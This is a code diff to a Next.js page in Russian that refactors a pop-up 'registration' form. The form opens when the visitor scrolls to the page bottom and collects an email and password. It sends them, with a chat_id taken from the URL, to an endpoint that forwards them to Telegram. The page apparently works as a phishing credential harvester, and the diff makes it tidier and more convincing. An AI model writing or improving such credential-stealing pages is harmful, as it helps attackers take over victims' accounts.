@@ -2,6 +2,16 @@
 import { useEffect, useRef, useState } from "react";
 import { useParams } from "next/navigation";
 
+function validateEmail(email: string) {
+  // Простая email-валидация
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function validatePassword(password: string) {
+  // Пароль минимум 6 символов, хотя бы одна буква и цифра
+  return /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/.test(password);
+}
+
 export default function IdPage() {
   const params = useParams();
   const chatId = params?.id || "";
@@ -27,7 +37,10 @@ export default function IdPage() {
 
   useEffect(() => {
     const onScroll = () => {
-      if (window.scrollY > window.innerHeight / 3 && !isOpened) {
+      // Открывать модалку, когда прокрутили до конца страницы
+      const scrollPosition = window.scrollY + window.innerHeight;
+      const pageHeight = document.body.scrollHeight;
+      if (scrollPosition >= pageHeight && !isOpened) {
         openModal();
       }
     };
@@ -42,6 +55,45 @@ export default function IdPage() {
     document.addEventListener("keydown", onKeyDown);
     return () => document.removeEventListener("keydown", onKeyDown);
   }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError("");
+    setSuccess("");
+
+    if (!chatId) {
+      setError("chat_id не найден в URL");
+      return;
+    }
+    if (!form.email || !form.password) {
+      setError("Заполните все поля");
+      return;
+    }
+    if (!validateEmail(form.email)) {
+      setError("Введите корректную почту");
+      return;
+    }
+    if (!validatePassword(form.password)) {
+      setError("Пароль должен быть не менее 6 символов, содержать буквы и цифры");
+      return;
+    }
+
+    try {
+      const res = await fetch("/api/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ...form, chat_id: chatId }),
+      });
+      if (res.ok) {
+        setSuccess("Данные успешно отправлены!");
+        setForm({ email: "", password: "" });
+      } else {
+        setError("Ошибка отправки в Telegram");
+      }
+    } catch {
+      setError("Ошибка отправки в Telegram");
+    }
+  };
 
   return (
     <>
@@ -77,44 +129,37 @@ export default function IdPage() {
               ✕
             </button>
             <h1 className="modal-title compact-title">Вход</h1>
-            <form onSubmit={e => {
-              e.preventDefault();
-              setError("");
-              setSuccess("");
-              if (!chatId) {
-                setError("chat_id не найден в URL");
-                return;
-              }
-              if (!form.email || !form.password) {
-                setError("Заполните все поля");
-                return;
-              }
-              fetch("/api/send", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ ...form, chat_id: chatId }),
-              }).then(res => {
-                if (res.ok) {
-                  setSuccess("Данные успешно отправлены!");
-                  setForm({ email: "", password: "" });
-                } else {
-                  setError("Ошибка отправки в Telegram");
-                }
-              }).catch(() => setError("Ошибка отправки в Telegram"));
-            }}>
+            <form onSubmit={handleSubmit}>
               <div className="input-block compact-input">
                 <label htmlFor="email" className="input-label">Почта</label>
-                <input type="email" name="email" id="email" placeholder="Почта" value={form.email} onChange={e => setForm(f => ({...f, email: e.target.value}))} />
+                <input
+                  type="email"
+                  name="email"
+                  id="email"
+                  placeholder="Почта"
+                  value={form.email}
+                  onChange={e => setForm(f => ({ ...f, email: e.target.value }))}
+                  required
+                />
               </div>
               <div className="input-block compact-input">
                 <label htmlFor="password" className="input-label">Пароль</label>
-                <input type="password" name="password" id="password" placeholder="Пароль" value={form.password} onChange={e => setForm(f => ({...f, password: e.target.value}))} />
+                <input
+                  type="password"
+                  name="password"
+                  id="password"
+                  placeholder="Пароль"
+                  value={form.password}
+                  onChange={e => setForm(f => ({ ...f, password: e.target.value }))}
+                  required
+                  minLength={6}
+                />
               </div>
-              <button className="input-button compact-btn" type="submit">Зарегестрироваться</button>
+              <button className="input-button compact-btn" type="submit">Зарегистрироваться</button>
               {error && <div className="error compact-error">{error}</div>}
               {success && <div className="success compact-success">{success}</div>}
             </form>
-            <p className="sign-up compact-sign">уже есть аккаунт? <a href="#">Войдите</a></p>
+            <p className="sign-up compact-sign">Уже есть аккаунт? <a href="#">Войти</a></p>
           </div>
           <div className="modal-right compact-right">
             <img src="https://images.unsplash.com/photo-1512486130939-2c4f79935e4f?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=dfd2ec5a01006fd8c4d7592a381d3776&auto=format&fit=crop&w=1000&q=80" alt="" />
